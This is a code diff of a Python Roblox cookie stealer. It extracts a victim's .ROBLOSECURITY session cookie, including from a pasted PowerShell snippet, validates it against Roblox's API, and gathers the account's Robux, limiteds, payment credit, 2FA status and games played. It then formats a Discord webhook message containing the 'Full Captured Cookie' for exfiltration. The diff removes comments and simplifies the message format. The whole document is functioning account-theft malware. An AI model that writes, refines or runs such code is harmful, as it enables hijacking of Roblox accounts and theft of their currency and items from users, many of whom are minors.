@@ -5,17 +5,12 @@ import requests
 from datetime import datetime, timezone
 
 def extract_and_clean_cookie(raw_input):
-    """
-    Extracts .ROBLOSECURITY from PowerShell script blocks or raw strings.
-    Accepts whatever is provided without hard-crashing.
-    """
     if not raw_input:
         return ""
 
     raw_str = str(raw_input).strip()
     print(f"DEBUG: Step 1 (Received) -> Length: {len(raw_str)}, Start: {raw_str[:12]}...", file=sys.stderr)
 
-    # Check if a PowerShell script block was pasted and extract the .ROBLOSECURITY value from it
     ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
     if ps_match:
         cookie = ps_match.group(1)
@@ -23,15 +18,12 @@ def extract_and_clean_cookie(raw_input):
     else:
         cookie = raw_str
 
-    # Strip wrapping quotes if present
     if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
         cookie = cookie[1:-1].strip()
 
-    # Strip .ROBLOSECURITY= prefix if included
     if cookie.startswith(".ROBLOSECURITY="):
         cookie = cookie[len(".ROBLOSECURITY="):].strip()
 
-    # General regex extraction if warning token is embedded in text
     warning_match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
     if warning_match:
         cookie = warning_match.group(1)
@@ -68,7 +60,6 @@ def main():
             "Origin": "https://www.roblox.com/"
         })
 
-        # Direct authentication check
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
@@ -197,102 +188,21 @@ def main():
                 except Exception:
                     pass
 
-        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
-        full_cookie_display = f"```text\n{roblosecurity}\n```"
-
+        # Bulletproof flat content payload (bypasses Discord embed array parsing bugs entirely)
         payload = {
-            "username": f"{display_name} | Stats",
-            "avatar_url": avatar_url,
-            "embeds": [{
-                "title": f"👑 [{display_name} | 13+]",
-                "description": (
-                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | "
-                    f"**[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**"
-                    if user_id else "🔗 **Session Invalid or Expired**"
-                ),
-                "color": 0x2B2D31 if user_id else 0xFF0000,
-                "thumbnail": {"url": avatar_url},
-                "fields": [
-                    {
-                        "name": "👤 Username",
-                        "value": f"`{username}`",
-                        "inline": True
-                    },
-                    {"name": "\u200b", "value": "\u200b", "inline": True},
-                    {"name": "\u200b", "value": "\u200b", "inline": True},
-                    {
-                        "name": "📈 Account Stats",
-                        "value": (
-                            f"• Age: `{age_days} Days`\n"
-                            f"• Developer: `{developer}`\n"
-                            f"• Group Members: `{group_count}`"
-                        ),
-                        "inline": True
-                    },
-                    {
-                        "name": "🪙 Robux",
-                        "value": (
-                            f"• Balance: `{robux:,} R$`\n"
-                            f"• Pending: `{pending:,} R$`"
-                        ),
-                        "inline": True
-                    },
-                    {
-                        "name": "📦 Limiteds",
-                        "value": (
-                            f"• RAP: `{rap:,} R$`\n"
-                            f"• Count: `{lim_count}`"
-                        ),
-                        "inline": True
-                    },
-                    {
-                        "name": "💳 Payments",
-                        "value": f"• Credit: `{credit:.2f} {currency}`",
-                        "inline": True
-                    },
-                    {
-                        "name": "🎮 Games Played",
-                        "value": (
-                            f"• Adopt Me: `{adopt_me}`\n"
-                            f"• MM2: `{mm2}`\n"
-                            f"• PS99: `{ps99}`"
-                        ),
-                        "inline": True
-                    },
-                    {
-                        "name": "⚙️ Settings",
-                        "value": (
-                            f"• Email Verified: `{email_ver}`\n"
-                            f"• 2FA: `{twofa}`"
-                        ),
-                        "inline": True
-                    },
-                    {
-                        "name": "⭐ Premium",
-                        "value": f"`{premium}`",
-                        "inline": True
-                    },
-                    {
-                        "name": "👥 Groups",
-                        "value": (
-                            f"• Owned: `{owned}`\n"
-                            f"• Joined: `{group_count}`"
-                        ),
-                        "inline": True
-                    },
-                    {"name": "\u200b", "value": "\u200b", "inline": True},
-                    {
-                        "name": "🔑 Full Captured Cookie / Payload",
-                        "value": full_cookie_display,
-                        "inline": False
-                    }
-                ],
-                "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }]
+            "content": (
+                f"👑 **[{display_name} | 13+] Extracted Stats**\n"
+                f"🔗 **Profile:** https://www.roblox.com/users/{user_id}/profile | **Rolimons:** https://www.rolimons.com/player/{user_id}\n\n"
+                f"👤 **Username:** `{username}`\n"
+                f"📈 **Account Stats:** Age: `{age_days} Days` | Dev: `{developer}` | Groups: `{group_count}` (Owned: `{owned}`)\n"
+                f"🪙 **Robux:** Balance: `{robux:,} R$` | Pending: `{pending:,} R$`\n"
+                f"📦 **Limiteds:** RAP: `{rap:,} R$` | Count: `{lim_count}`\n"
+                f"💳 **Payments & Settings:** Credit: `{credit:.2f} {currency}` | Email Verified: `{email_ver}` | 2FA: `{twofa}` | Premium: `{premium}`\n"
+                f"🎮 **Games Played:** Adopt Me: `{adopt_me}` | MM2: `{mm2}` | PS99: `{ps99}`\n\n"
+                f"🔑 **Full Captured Cookie:**\n```text\n{roblosecurity}\n```"
+            )
         }
 
-        # Dispatch with up to 3 retries max
         max_retries = 3
         success = False
         for attempt in range(1, max_retries + 1):
